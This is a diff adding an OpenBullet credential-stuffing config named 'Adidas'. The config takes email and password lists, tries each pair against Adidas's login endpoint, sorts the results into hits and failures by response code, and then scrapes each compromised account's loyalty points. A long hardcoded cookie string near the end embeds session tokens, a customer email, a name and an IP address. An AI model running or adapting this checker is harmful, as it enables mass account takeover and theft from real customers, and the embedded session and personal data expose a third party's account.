@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "Adidas",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-19T15:09:27.9428471+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://crm.adidas.com/accounts/authentication" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"countryOfSite\":\"US\",\"communicationLanguage\":\"en\",\"pfStartSSOURL\":\"https://cp.adidas.com/idp/startSSO.ping\",\"idpAdapterId\":\"adidasIdP10\",\"partnerSpId\":\"sp:demandware\",\"targetResource\":\"https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/MyAccount-ResumeLogin?target=account\",\"inErrorResource\":\"https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/null\",\"loginUrl\":\"https://www.adidas.com/us/myaccount-create-or-login\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Origin: https://www.adidas.com" 
+  HEADER "Referer: https://www.adidas.com/us/myaccount-create-or-login" 
+  HEADER "X-Client-Id: 62wi38jgwliizcyxz5f193dtfoweqywh" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+REQUEST GET "https://www.adidas.com/us/myaccount-show" 
+  
+  COOKIE "geo_ip=178.203.146.31; geo_country=DE; onesite_country=US; akacd_phasedRC_FI_us_prod=3733131149~rv=64~id=c9f428d5b69d3d726c38395a8d203c61; bm_sz=A2F98ADC6DC711961095FD9571736981~YAAQXYw1VH8qXDNqAQAAxc2nNQMk1ZqqSwbfcDM1lJguf7sO3h54FmOeMJI+MO7XqR8wiw0i8iGX4+tHSmJ+pxbsBdwMY7SDtZRFPnOCsEF8lbxS8SvAanbscmyH7yCXIcsnxFukMiUWrHvTpzbMrSmzf0qA20n/4JLd+THEdDmU4N22zjDC5XhbX2uwn2xN; ab_monetate=a; MOBILE_ZOOM_ALERT_COOKIE=true; default_searchTerms_CustomizeSearch=%5B%5D; wishlist=%5B%5D; ab_optimizely=a; mt.v=5.588340071.1555678351839; geoRedirectionAlreadySuggested=true; _abck=A299B4A52B86BAC99FDA933378B6460A54358C5D480900008EC4B95C2414EC5C~0~ZKS+oS5XymbrDUspO50hl2LQEE/Ng39oafo3xLKF9wc=~-1~-1; __adi_rt_DkpyPh8=CRTOH2H; inf_media_split=test; ab_decibel=a; RES_TRACKINGID=779152862622435; ResonanceSegment=1; RES_SESSIONID=651466361763972; AKA_A2=A; dwanonymous_e23325cdedf446c9a41915343e601cde=abSkHbRea7GRdEzIfuhsvXNJEH; akacd_phased_PLP=3733131154~rv=56~id=b48315892aa74e0e7232ff4ebca14f1e; AMCVS_7ADA401053CCF9130A490D4C%40AdobeOrg=1; s_sess=%5B%5BB%5D%5D; s_cc=true; UserSignUpAndSave=2; ak_bmsc=1C8AC1DDD230DD9D17537DFE3C2A24D654358C5D4809000094C4B95C2D09044A~pl2ZPF5bDTyGP7JvRGMxInP9hAB5GzOqXKq7RxQSQFQqjHmuoY6FIdiG+vjugepmc98dj19f5qogpv/xf9tE9TfoxthMGgaCwWZ6+juhj3W7i27et7ziVriyhQ43Nnnc0sbMU7hYUGZjBM6sWlVyDjEdRV6loeZTxOmJhuvT5JYBVi/44j1gFScGVP++oOMDivE2JFBIzuXB4yANApvZIH30os9fjPI8gsUMu0vANW5MA=; isYourReebokLogin=\"\"; __cq_dnt=0; dw_dnt=0; SSOAuthParams=https%7CMyAccount-Show%7Cfromlogin%3Dtrue; onesite_language=en; onesite_country=US; onesite_market=US; freeShippingThreshold=null; basketTotal=0; notice_preferences=2: ; notice_gdpr_prefs=0,1,2:; cmapi_gtm_bl=; cmapi_cookie_privacy=permit 1,2,3; bm_sv=DD14EDAF4491C13CA0FA7BEE086335F3~BebRN1EH1d73wNBwfMJUAnLQbzf3wBwLLoHniLk35LWa6m+rBK9ixWfA8L41+B1FfkhurUWwSBV4vVxNus6Y6GVQwNb9qw4st/UxTGR9PybQJ355jY5NP1jb9qZQnQsBzR2hDAzotdE6bODSTHmc+hMnYUHyquDNpGi4BCPnZVY=; dwsecuretoken_e23325cdedf446c9a41915343e601cde=sFS-yiXQKhIP9PG2i6zDjw6V1piquxCWXg==; dwsid=XqNe8G5iLeKAWLShog-aO-DBZ-mk5oo8a4AWiplwvN4nPTgoLMjOYMVuhvPc-Kp8Lx_SK-H9f2c1vyUBvHiiQA==; username=8YJG4F66F43UDBC5; pagecontext_cookies=%7B%22logged_in%22%3Atrue%2C%22geo_country%22%3A%22DE%22%2C%22customer_id%22%3A%22aczvqisG0C2jHM4ztmhal5iGdU%22%2C%22euci%22%3A%228YJG4F66F43UDBC5%22%2C%22customer_first_name%22%3A%22xasixi%22%2C%22customer_last_name%22%3A%22afafafa%22%7D; dwac_bcl5MiaaieF4EaaadeoW6TIGjI=D5iZBotk30AYt8e73JR9jXhrSu1EA9MlSsc%3D|dw-only|35749638||USD|false|US%2FPacific|true; sid=iCr_UU5Fqdo1x1Yu9NZlZzZIxkiEwQ4E3h8; userBasketCount=\"\"; persistentBasketCount=\"\"; customer_hashed_email_pers=0bece5de2467037bf3deb3c2738da651; euci_persisted=8YJG4F66F43UDBC5; pagecontext_secure_cookies=%7B%22customer_email%22%3A%22xasixi%40direct-mail.info%22%2C%22customer_encrypted_email%22%3A%22Dro5xc4Jaa9ArEarZqCeQlT%2Ffs0WKtGO3F8jDpZ6e6M%253D%22%7D; bm_mi=3358D70F0452F6F51297FF8F43A4A30A~Fl7d1+e2RugWzqVftWXbTf8oneNQXLZoy/mv85JsISUNrC8vKf3sxHF1gvytZ2GGTr5aBB+crdjPQzw8woMH+aGOv2OcxZ5vmvcvBxAZ+e6gqEZ7SAU7E1j8y3y80YUX1eWnvzNowVRvxGKwNAlWsGDfcVBweFMaHdd8zouG+fLswwex2wnB1Zs68F+Q414P1K1D6K5tUK8i46iHn/dcaFxbaSoPT/ftuFv3wLJIaOeUY2YGVUgcquRDopri++Y4; LastPageUpdateTimestamp=1555678672273; utag_main=v_id:016a35a7d63700195cb9a295c9ad03073001906b00bd0$_sn:1$_se:17$_ss:0$_st:1555680472746$ses_id:1555678352955%3Bexp-session$_pn:6%3Bexp-session$_prevpage:ACCOUNT%7COVERVIEW%3Bexp-1555682272819; s_pers=%20s_vnum%3D1556661600598%2526vn%253D1%7C1556661600598%3B%20pn%3D1%7C1558270355610%3B%20s_invisit%3Dtrue%7C1555680473425%3B; AMCV_7ADA401053CCF9130A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18006%7CMCMID%7C61655547144291414152170219279663669612%7CMCAID%7CNONE%7CMCOPTOUT-1555685873s%7CNONE; adidas_country=on" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "authority: www.adidas.com" 
+  HEADER "method: GET" 
+  HEADER "path: /us/myaccount-show" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "span class=\"label-title\">Total points</span>" "</span>" -> VAR "TOTAL" 
+
+FUNCTION Replace "<span class=\"total-points\">" " " "<TOTAL>" -> CAP "Points" 
+
